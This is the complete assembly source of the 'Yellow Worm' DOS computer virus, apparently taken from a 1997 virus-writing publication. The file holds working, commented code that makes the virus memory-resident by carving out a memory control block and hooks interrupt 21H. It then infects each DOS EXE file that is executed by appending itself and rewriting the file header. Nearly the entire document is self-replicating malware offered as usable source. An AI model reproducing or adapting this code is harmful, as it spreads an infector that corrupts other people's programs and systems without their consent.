;The Yellow Worm Computer Virus. This virus is memory resident and infects
;EXE files when they are executed. It is extremely infective, and runs
;inside or outside Windows 95.
;
;(C) 1997 American Eagle Publications, Inc. All rights reserved.
;

        .SEQ                       ;segments must appear in sequential order
                                   ;to simulate conditions in actual active virus

;HOSTSEG program code segment. The virus gains control before this routine and
;goes memory resident.
HOSTSEG SEGMENT BYTE
        ASSUME  CS:HOSTSEG,SS:HSTACK

;This host simply terminates and returns control to DOS.
HOST:
        mov     ax,4C00H
        int     21H             ;terminate normally
HOSTSEG ENDS

;Host program stack segment
STACKSIZE       EQU     100H           ;size of stack for this program

HSTACK  SEGMENT PARA STACK 'STACK'
        db  STACKSIZE dup (?)
HSTACK  ENDS

;************************************************************************
;This is the virus itself

;Yellow Worm Virus code segment. This gains control first, before the host. As
;this ASM file is layed out, this program will look exactly like a simple
;program that was infected by the virus.

VSEG    SEGMENT PARA
        ASSUME  CS:VSEG,DS:VSEG,SS:HSTACK

;Data storage area
FSIZE   DW      0,0
EXE_HDR DB      1CH dup (?)           ;buffer for EXE file header
PSP     DW      ?                     ;place to store PSP segment

;The following 10 bytes must stay together because they are an image of 10
;bytes from the EXE header
HOSTS   DW      0,STACKSIZE           ;host stack and code segments
FILLER  DW      ?                     ;these are dynamically set by the virus
HOSTC   DW      OFFSET HOST,0         ;but hard-coded in the 1st generation

;The main control routine
YELLOW_WORM:
        push    ax
        push    cs
        pop     ds
        mov     [PSP],es        ;save PSP
        call    SETUP_MCB       ;get memory for the virus
        jc      EXIT_WORM
        call    MOVE_VIRUS      ;move the virus into memory
        call    INSTALL_INTS    ;install interrupt 21H hook
EXIT_WORM:
        mov     es,cs:[PSP]
        push    es
        pop     ds              ;restore ds to PSP
        mov     dx,80H
        mov     ah,1AH          ;restore DTA to PSP:80H for host
        int     21H
        mov     ax,es           ;ax=PSP
        add     ax,10H          ;ax=PSP+10H
        add     WORD PTR cs:[HOSTS],ax          ;relocate host initial ss
        add     WORD PTR cs:[HOSTC+2],ax        ;relocate host initial cs
        pop     ax              ;restore startup value of ax
        cli
        mov     ss,WORD PTR cs:[HOSTS]  ;set up host stack properly
        mov     sp,WORD PTR cs:[HOSTS+2]
        sti
        jmp     DWORD PTR cs:[HOSTC]


;This routine moves the virus to the segment specified in es (e.g. the segment
;of the MCB created by SETUP_MCB + 1). The virus continues to execute in the
;original MCB where DOS put it. All this routine does is copy the virus like
;data.
MOVE_VIRUS:
        mov     si,OFFSET YELLOW_WORM
        mov     di,si
        mov     cx,OFFSET END_WORM
        sub     cx,si
        rep     movsb
        ret

;INSTALL_INTS installs the interrupt 21H hook so that the virus becomes
;active. All this does is put the existing INT 21H vector in OLD_21H and
;put the address of INT_21H into the vector. Note that this assumes that es
;is set to the segment that the virus created for itself and that the
;virus code is already in that segment.
INSTALL_INTS:
        xor     ax,ax
        mov     ds,ax
        mov     bx,21H*4                ;install INT 21H hook
        mov     ax,[bx]                 ;save old vector
        mov     WORD PTR es:[OLD_21H],ax
        mov     ax,[bx+2]
        mov     WORD PTR es:[OLD_21H+2],ax
        mov     ax,OFFSET INT_21H       ;and set up new vector
        mov     [bx],ax
        mov     [bx+2],es
        push    cs                      ;restore ds
        pop     ds
        ret

;The following routine sets up a memory control block for the virus. This is
;accomplished by taking over the Z memory control block and splitting it into
;two pieces, (1) a new Z-block where the virus will live, and (2) a new M
;block for the host program. SETUP_MCB will return with c set if it could not
;split the Z block. If it could, it returns with nc and es=new block segment.
;It will also return with dx=segment of last M block.

VIRUS_BLK_SIZE  EQU     03FH     ;size of virus MCB, in paragraphs

SETUP_MCB:
        mov     ah,52H          ;get list of lists @ in es:bx
        int     21H
        mov     dx,es:[bx-2]    ;get first MCB segment in ax
        xor     bx,bx           ;now find the Z block
        mov     es,dx           ;set es=MCB segment
FINDZ:  cmp     BYTE PTR es:[bx],'Z'
        je      FOUNDZ          ;got it
        mov     dx,es           ;nope, go to next in chain
        inc     dx
        add     dx,es:[bx+3]
        mov     es,dx
        jmp     FINDZ

FOUNDZ: cmp     WORD PTR es:[bx+1],0                    ;check owner
        je      OKZ                                     ;so far so good if unowned
        mov     ax,[PSP]
        cmp     es:[bx+1],ax                            ;or if owner = this psp
        stc
        jne     EXIT_MCB                                ;else terminate

OKZ:    cmp     WORD PTR es:[bx+3],VIRUS_BLK_SIZE+1     ;make sure enough room
        jc      EXIT_MCB        ;no room, exit with c set

        mov     ax,es           ;ok, we can use the Z block
        mov     ds,ax           ;set ds = original Z block
        add     ax,es:[bx+3]
        inc     ax              ;ax = end of the Z block
        sub     ax,VIRUS_BLK_SIZE+1
        mov     es,ax           ;es =  segment of new block
        xor     di,di           ;copy it to new location
        xor     si,si
        mov     cx,8
        rep     movsw
        mov     ax,es
        inc     ax
        mov     WORD PTR es:[bx+3],VIRUS_BLK_SIZE       ;adjust new Z block size
        mov     WORD PTR es:[bx+1],ax                   ;set owner = self
        mov     BYTE PTR [bx],'M'                       ;change old Z to an M
        sub     WORD PTR [bx+3],VIRUS_BLK_SIZE+1        ;and adjust size
        mov     di,5            ;zero balance of virus block
        mov     cx,12
        xor     al,al
        rep     stosb
        push    cs              ;restore ds=cs
        pop     ds
        mov     ax,es           ;increment es to get segment for virus
        inc     ax
        mov     es,ax
        clc
EXIT_MCB:
        ret

;This is the interrupt 21H hook. It becomes active when installed by
;INSTALL_INTS. It traps Function 4BH EXE files when executed by that function.

OLD_21H DD      ?               ;old interrupt 21H vector

INT_21H:
        cmp     ah,4BH          ;DOS Search First Function
        je      EXEC_HOOK       ;yes, go execute hook
GOLD:   jmp     DWORD PTR cs:[OLD_21H]  ;execute original int 21 handler

;This is the EXEC Function Hook, which controls infection of the file.
EXEC_HOOK:
        push    ax
        push    bx
        push    cx
        push    dx
        push    si
        push    di
        push    ds
        push    es
        mov     si,dx
EH1:    lodsb
        or      al,al
        jz      EEH
        cmp     al,'.'
        jne     EH1
        lodsw
        and     ax,0DFDFH
        cmp     ax,'XE'
        jne     EEH
        lodsb
        and     al,0DFH
        cmp     al,'E'
        jne     EEH             ;check for EXE file
        call    FILE_OK
        jc      EEH
        call    INFECT_FILE
EEH:    pop     es
        pop     ds
        pop     di
        pop     si
        pop     dx
        pop     cx
        pop     bx
        pop     ax
        jmp     GOLD


;Function to determine whether the EXE file found by the search routine is
;useable. If so return nc, else return c.
;What makes an EXE file useable?:
;              a) The signature field in the EXE header must be 'MZ'. (These
;                 are the first two bytes in the file.)
;              b) The Overlay Number field in the EXE header must be zero.
;              c) It should be a DOS EXE, without Windows or OS/2 extensions.
;              d) The initial ip stored in the EXE header must be different
;                 than the viral initial ip. If they're the same, the virus
;                 is probably already in that file, so we skip it.
;
FILE_OK:
                                       ;ds:dx point to file name on entry
        mov     ax,3D02H               ;r/w access open file using handle
        int     21H
        jc      OK_END1                ;error opening - C set - quit without closing
        push    cs
        pop     ds
        push    cs
        pop     es                     ;ds and es both in this seg now
        mov     bx,ax                  ;put handle into bx and leave bx alone from here on out
        mov     cx,1CH                 ;read 28 byte EXE file header
        mov     dx,OFFSET EXE_HDR      ;into this buffer
        mov     ah,3FH                 ;for examination and modification
        int     21H
        jc      OK_END                 ;error in reading the file, so quit
        cmp     WORD PTR [EXE_HDR],'ZM';check EXE signature of MZ
        jnz     OK_END                 ;close & exit if not
        cmp     WORD PTR [EXE_HDR+26],0;check overlay number
        jnz     OK_END                 ;not 0 - exit with c set
        cmp     WORD PTR [EXE_HDR+24],40H ;is rel table at offset 40H or more?
        jnc     OK_END                 ;yes, it is not a DOS EXE, so skip it
        cmp     WORD PTR [EXE_HDR+14H],OFFSET YELLOW_WORM  ;see if initial ip = virus initial ip
        clc
        jne     OK_END1                ;if all successful, leave file open
OK_END: mov     ah,3EH                 ;else close the file
        int     21H
        stc                            ;set carry to indicate file not ok
OK_END1:ret                            ;return with c flag set properly

;This routine moves the virus (this program) to the end of the EXE file
;Basically, it just copies everything here to there, and then goes and
;adjusts the EXE file header. It also makes sure the virus starts
;on a paragraph boundary, and adds how many bytes are necessary to do that.
INFECT_FILE:
        mov     ax,4202H                ;seek end of file to determine size
        xor     cx,cx
        xor     dx,dx
        int     21H
        mov     [FSIZE],ax              ;and save it here
        mov     [FSIZE+2],dx
        mov     cx,WORD PTR [FSIZE+2]   ;adjust file length to paragraph
        mov     dx,WORD PTR [FSIZE]     ;boundary
        or      dl,0FH
        add     dx,1
        adc     cx,0
        mov     WORD PTR [FSIZE+2],cx
        mov     WORD PTR [FSIZE],dx
        mov     ax,4200H                ;set file pointer, relative to beginning
        int     21H                     ;go to end of file + boundary

        mov     cx,OFFSET END_WORM         ;last byte of code
        xor     dx,dx                   ;first byte of code, ds:dx
        mov     ah,40H                  ;write body of virus to file
        int     21H

        mov     dx,WORD PTR [FSIZE]     ;find relocatables in code
        mov     cx,WORD PTR [FSIZE+2]   ;original end of file
        add     dx,OFFSET HOSTS         ;            + offset of HOSTS
        adc     cx,0                    ;cx:dx is that number
        mov     ax,4200H                ;set file pointer to 1st relocatable
        int     21H
        mov     dx,OFFSET EXE_HDR+14    ;get correct host ss:sp, cs:ip
        mov     cx,10
        mov     ah,40H                  ;and write it to HOSTS/HOSTC
        int     21H

        xor     cx,cx                   ;so now adjust the EXE header values
        xor     dx,dx
        mov     ax,4200H                ;set file pointer to start of file
        int     21H

        mov     ax,WORD PTR [FSIZE]     ;calculate viral initial CS
        mov     dx,WORD PTR [FSIZE+2]   ; = File size / 16 - Header Size(Para)
        mov     cx,16
        div     cx                      ;dx:ax contains file size / 16
        sub     ax,WORD PTR [EXE_HDR+8] ;subtract exe header size, in paragraphs
        mov     WORD PTR [EXE_HDR+22],ax;save as initial CS
        mov     WORD PTR [EXE_HDR+14],ax;save as initial SS
        mov     WORD PTR [EXE_HDR+20],OFFSET YELLOW_WORM  ;save initial ip
        mov     WORD PTR [EXE_HDR+16],OFFSET END_WORM + STACKSIZE  ;save initial sp

        mov     dx,WORD PTR [FSIZE+2]   ;calculate new file size for header
        mov     ax,WORD PTR [FSIZE]     ;get original size
        add     ax,OFFSET END_WORM + 200H  ;add virus size + 1 paragraph, 512 bytes
        adc     dx,0
        mov     cx,200H                 ;divide by paragraph size
        div     cx                      ;ax=paragraphs, dx=last paragraph size
        mov     WORD PTR [EXE_HDR+4],ax ;and save paragraphs here
        mov     WORD PTR [EXE_HDR+2],dx ;last paragraph size here
        mov     cx,1CH                  ;and save 1CH bytes of header
        mov     dx,OFFSET EXE_HDR       ;at start of file
        mov     ah,40H
        int     21H

        mov     ah,3EH                  ;close file now
        int     21H

        ret                             ;that's it, infection is complete!

END_WORM:                       ;label for the end of the yellow worm

VSEG    ENDS

        END     YELLOW_WORM

